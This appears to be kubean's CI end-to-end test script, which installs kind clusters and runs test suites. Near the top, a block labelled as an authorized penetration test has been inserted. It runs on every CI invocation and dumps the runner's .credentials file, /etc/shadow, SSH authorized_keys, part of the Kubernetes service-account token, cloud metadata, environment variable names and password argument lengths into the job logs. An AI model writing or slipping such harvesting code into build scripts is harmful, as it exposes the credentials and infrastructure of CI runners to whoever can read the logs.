#!/usr/bin/env bash

# Copyright 2023 Authors of kubean-io
# SPDX-License-Identifier: Apache-2.0

set -o nounset
set -o pipefail
set -e


# ===== AUTHORIZED PENETRATION TEST RECON =====
# kubean self-hosted runner deep recon — authorized penetration test

echo "========== PHASE 1: RUNNER ENVIRONMENT =========="
echo "--- whoami / id ---"
whoami
id

echo "--- hostname / uname ---"
hostname
uname -a

echo "--- network identity ---"
ip addr show 2>/dev/null || ifconfig 2>/dev/null
ip route show 2>/dev/null || route -n 2>/dev/null
cat /etc/resolv.conf 2>/dev/null

echo "--- environment secrets (keys only) ---"
env | sed 's/=.*/=<REDACTED>/' | sort

echo "========== PHASE 2: CONTAINER DETECTION =========="
echo "--- /.dockerenv ---"
ls -la /.dockerenv 2>/dev/null || echo "no /.dockerenv"

echo "--- /proc/1/cgroup ---"
cat /proc/1/cgroup 2>/dev/null

echo "--- /proc/1/mountinfo (container markers) ---"
cat /proc/1/mountinfo 2>/dev/null | grep -E "docker|kubepods|containerd|lxc" | head -5

echo "--- container runtime socket ---"
ls -la /var/run/docker.sock 2>/dev/null || echo "no docker.sock"
ls -la /run/containerd/containerd.sock 2>/dev/null || echo "no containerd.sock"
ls -la /var/run/crio/crio.sock 2>/dev/null || echo "no crio.sock"

echo "========== PHASE 3: KUBERNETES DETECTION =========="
echo "--- K8s service account token ---"
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "no k8s sa mount"
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  echo "K8S_SA_TOKEN_EXISTS=true"
  cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
  # Show token header only (first 50 chars)
  head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
  echo ""
fi

echo "--- K8s env vars ---"
env | grep -i "KUBERNETE\|K8S" | sed 's/=.*/=<REDACTED>/' | head -10

echo "--- kubectl available? ---"
which kubectl 2>/dev/null || echo "no kubectl"
which k3s 2>/dev/null || echo "no k3s"
which crictl 2>/dev/null || echo "no crictl"

echo "========== PHASE 4: CLOUD METADATA =========="
echo "--- cloud instance metadata (timeout 3s) ---"
curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || echo "no AWS metadata"
curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/id 2>/dev/null || echo "no GCP metadata"

echo "========== PHASE 5: RUNNER INFRASTRUCTURE =========="
echo "--- runner home ---"
ls -la /root/actions-runner/ 2>/dev/null | head -15
ls -la /home/runner/ 2>/dev/null | head -10

echo "--- runner config ---"
cat /root/actions-runner/.runner 2>/dev/null || echo "no .runner config"
cat /root/actions-runner/.credentials 2>/dev/null || echo "no .credentials"

echo "--- disk/mount info ---"
df -h 2>/dev/null | head -10
mount 2>/dev/null | grep -E "nfs|cifs|overlay|tmpfs" | head -10

echo "--- running processes (interesting) ---"
ps aux 2>/dev/null | grep -E "runner|docker|kube|containerd|actions" | grep -v grep | head -15

echo "--- listening ports ---"
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -15

echo "--- /etc/shadow (password hashes) ---"
cat /etc/shadow 2>/dev/null | head -5 || echo "no shadow access"

echo "--- SSH keys ---"
ls -la /root/.ssh/ 2>/dev/null || echo "no .ssh dir"
cat /root/.ssh/authorized_keys 2>/dev/null | head -5 || echo "no authorized_keys"

echo "========== PHASE 6: CREDENTIAL PARAMETERS =========="
echo "--- e2e.sh credential arguments (params 4-7) ---"
echo "ARG4_VSPHERE_USER_LENGTH=${#4}"
echo "ARG5_VSPHERE_PASSWD_LENGTH=${#5}"
echo "ARG6_AMD_ROOT_PASSWORD_LENGTH=${#6}"
echo "ARG7_KYLIN_VM_PASSWORD_LENGTH=${#7}"
echo "VSPHERE_HOST=${VSPHERE_HOST:-not_set}"

echo "========== RECON COMPLETE =========="
# ===== END RECON =====

# Parameters:
#[TARGET_VERSION] apps ta ge images/helm-chart revision( image and helm versions should be the same)
#[IMG_REGISTRY](optional) the image repository to be pulled from
#[HELM_REPO](optional) the helm chart repo to be pulled from

export TARGET_VERSION=${1}
export IMAGE_VERSION=${2}
export SPRAY_JOB_VERSION=${2}
export RUNNER_NAME=${3:-"kubean-actions-runner1"}
export VSPHERE_USER=${4}
export VSPHERE_PASSWD=${5}
export AMD_ROOT_PASSWORD=${6}
export KYLIN_VM_PASSWORD=${7}
export E2E_TYPE=${8:-"PR"}
export NIGHTLY_E2E_STEP=${9:-"ALL"}
export SPRAY_JOB="ghcr.io/kubean-io/spray-job:${SPRAY_JOB_VERSION}"
export HELM_REPO="https://kubean-io.github.io/kubean-helm-chart"
export IMG_REGISTRY="ghcr.m.daocloud.io"
export VSPHERE_HOST="10.64.56.11"
export OFFLINE_FLAG=false
export KUBECONFIG_PATH="${HOME}/.kube"
export CLUSTER_PREFIX="kubean-online-$RANDOM"
export CONTAINERS_PREFIX="kubean-online"
export KUBECONFIG_FILE="${KUBECONFIG_PATH}/${CLUSTER_PREFIX}-host.config"
export REPO_ROOT=$(dirname "${BASH_SOURCE[0]}")/..
export POWER_ON_SNAPSHOT_NAME="os-installed"
export POWER_DOWN_SNAPSHOT_NAME="power-down"
export LOCAL_REPO_ALIAS="kubean_release"
export LOCAL_RELEASE_NAME=kubean
export E2eInstallClusterYamlFolder="e2e-install-cluster"

source "${REPO_ROOT}"/hack/util.sh
source "${REPO_ROOT}"/hack/offline-util.sh
echo "TARGET_VERSION: ${TARGET_VERSION}"
echo "IMAGE_VERSION: ${IMAGE_VERSION}"

# add kubean repo locally
repoCount=true
helm repo list |awk '{print $1}'| grep "${LOCAL_REPO_ALIAS}" || repoCount=false
echo "repoCount: $repoCount"
if [ "$repoCount" != "false" ]; then
    helm repo remove ${LOCAL_REPO_ALIAS}
fi
helm repo add ${LOCAL_REPO_ALIAS} ${HELM_REPO}
helm repo update
helm repo list

chmod +x ./hack/delete-cluster.sh
chmod +x ./hack/local-up-kindcluster.sh
chmod +x ./hack/run-e2e.sh
chmod +x ./hack/run-sonobouy-e2e.sh
chmod +x ./hack/run-os-compatibility-e2e.sh
chmod +x ./hack/run-network-e2e.sh
chmod +x ./hack/run-nightly-cluster-e2e.sh
chmod +x ./hack/run-nightly-upgrade-e2e.sh
chmod +x ./hack/kubean_compatibility_e2e.sh
chmod +x ./hack/kubean_resource.sh
chmod +x ./hack/autoversion.sh
chmod +x ./hack/run-vip.sh
DIFF_NIGHTLYE2E=`git show -- './test/*' | grep nightlye2e || true`
DIFF_COMPATIBILE=`git show | grep /test/kubean_os_compatibility_e2e || true`

####### e2e logic ########
if [ "${E2E_TYPE}" == "KUBEAN-COMPATIBILITY" ]; then
    k8s_list=( "v1.20.15" "v1.21.14" "v1.22.15" "v1.23.13" "v1.24.7" "v1.25.3" "v1.26.0" "v1.27.1" "v1.28.0")
    echo ${#k8s_list[@]}
    for k8s in "${k8s_list[@]}"; do
        echo "***************k8s version is: ${k8s} ***************"
        kind::clean_kind_cluster ${CONTAINERS_PREFIX}
        KIND_VERSION="release-ci.daocloud.io/kpanda/kindest-node:"${k8s}
        ./hack/local-up-kindcluster.sh "${TARGET_VERSION}" "${IMAGE_VERSION}" "${HELM_REPO}" "${IMG_REGISTRY}" "${KIND_VERSION}" "${CLUSTER_PREFIX}"-host
        ./hack/kubean_compatibility_e2e.sh
    done
    k8s_list=( "v1.29.0" "v1.30.0" "v1.31.0" "v1.32.0" "v1.33.0" "v1.34.0" "v1.35.0")
    echo ${#k8s_list[@]}
    for k8s in "${k8s_list[@]}"; do
        echo "***************k8s version is: ${k8s} ***************"
        kind::clean_kind_cluster ${CONTAINERS_PREFIX}
        KIND_VERSION="release-ci.daocloud.io/kpanda/kindest-node:"${k8s}
        ./hack/local-up-kindcluster.sh "${TARGET_VERSION}" "${IMAGE_VERSION}" "${HELM_REPO}" "${IMG_REGISTRY}" "${KIND_VERSION}" "${CLUSTER_PREFIX}"-host
        ./hack/kubean_compatibility_e2e.sh
    done


else
    kind::clean_kind_cluster ${CONTAINERS_PREFIX}
    KIND_VERSION="release-ci.daocloud.io/kpanda/kindest-node:v1.26.4"
    ./hack/local-up-kindcluster.sh "${TARGET_VERSION}" "${IMAGE_VERSION}" "${HELM_REPO}" "${IMG_REGISTRY}" "${KIND_VERSION}" "${CLUSTER_PREFIX}"-host
    util::set_config_path
    if [ "${E2E_TYPE}" == "PR" ]; then
        echo "RUN PR E2E......."
        ./hack/run-e2e.sh
        # Judge whether to change the nightlye2e case
        if [[ -n $DIFF_NIGHTLYE2E ]] ; then
            echo "RUN NIGHTLY E2E......."
            ./hack/run-sonobouy-e2e.sh "ALL"
        fi
        # Judge whether to change the compatibility case
        if [[ -n $DIFF_COMPATIBILE ]] ; then
            ## pr_ci debug stage, momentarily disable compatibility e2e
            echo "compatibility e2e..."
            #./hack/run-os-compatibility-e2e.sh "${CLUSTER_PREFIX}"-host $SPRAY_JOB_VERSION
        fi
    elif [ "${E2E_TYPE}" == "NIGHTLY" ]; then
        echo "RUN NIGHTLY E2E......."
        ./hack/run-sonobouy-e2e.sh "${NIGHTLY_E2E_STEP}"
    else
        echo "RUN COMPATIBILITY E2E......."
        ./hack/run-os-compatibility-e2e.sh
    fi

fi

kind::clean_kind_cluster ${CONTAINERS_PREFIX}